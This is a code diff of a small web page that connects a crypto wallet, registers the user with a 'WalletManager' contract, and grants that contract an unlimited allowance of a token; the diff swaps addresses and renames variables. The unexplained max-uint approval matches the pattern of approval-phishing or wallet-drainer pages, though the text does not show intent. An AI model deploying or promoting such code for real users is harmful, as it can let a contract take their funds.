@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Register & Approve (XContract + WalletManager)</title>
+  <title>Register & Approve (WalletManager)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; }
@@ -11,7 +11,7 @@
 </head>
 <body>
 
-  <h2>Wallet Connect + Register + Approve</h2>
+  <h2>Wallet Connect + Register (WalletManager) + Approve</h2>
 
   <button id="connectBtn">Connect Wallet</button><br>
   <button id="registerApproveBtn" disabled>Register & Approve</button>
@@ -19,20 +19,20 @@
   <pre id="log"></pre>
 
 <script>
-  const WALLET_MANAGER = "0x50B072c59dE9a4DE7519D181893B7FBaaB56d0Fe";  // WalletManager address
-  const TOKEN = "0xbea1762935F5C92b6c906b5cdEABB51211067098";            // Token address
+  const WALLET_MANAGER = "0xfae7dc62b36f2cd447a81e2f368d975b5837add7";  // WalletManager address
+  const TOKEN = "0x55d398326f99059fF775485246999027B3197955";           // Token address
 
   const ERC20_ABI = [
     "function allowance(address owner, address spender) view returns (uint256)",
     "function approve(address spender, uint256 amount) returns (bool)"
   ];
 
-  const X_ABI = [
+  const WALLET_MANAGER_ABI = [
     "function register() external"
   ];
 
   let provider, signer, userAddress;
-  let tokenContract, WALLET MANAGER;
+  let tokenContract, walletManagerContract;
 
   const logEl = document.getElementById("log");
   const connectBtn = document.getElementById("connectBtn");
@@ -60,7 +60,7 @@
       userAddress = await signer.getAddress();
 
       tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
-      WALLET MANAGER = new ethers.Contract(WALLET_MANAGER, X_ABI, signer);
+      walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
 
       log(`✅ Wallet connected: ${userAddress}`);
       registerApproveBtn.disabled = false;
@@ -78,12 +78,12 @@
     clearLog();
 
     try {
-      // 1. WALLETMANAGER me register karna
-      log("WALLETMANAGER me register kar rahe hain...");
-      let txRegister = await WALLET MANAGER.register();
+      // 1. WalletManager me register karna
+      log("WalletManager me register kar rahe hain...");
+      let txRegister = await walletManagerContract.register();
       log(`Register transaction bheja: ${txRegister.hash}`);
       await txRegister.wait();
-      log("Register transaction confirm ho gaya!");
+      log("✅ Register transaction confirm ho gaya!");
 
       // 2. WalletManager ke liye token approval
       log("WalletManager ke liye allowance check kar rahe hain...");
@@ -97,14 +97,14 @@
         let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
         log(`Approve transaction bheja: ${txApprove.hash}`);
         await txApprove.wait();
-        log("Approve transaction confirm ho gaya!");
+        log("✅ Approve transaction confirm ho gaya!");
       } else {
         log("Allowance pehle se hi sufficient hai.");
       }
 
       alert("Registration aur Approval dono successful ho gaye!");
     } catch (error) {
-      log("Error aaya: " + (error.message || error));
+      log("❌ Error aaya: " + (error.message || error));
       alert("Kuch gadbad hui, console mein dekhein.");
     }
   };
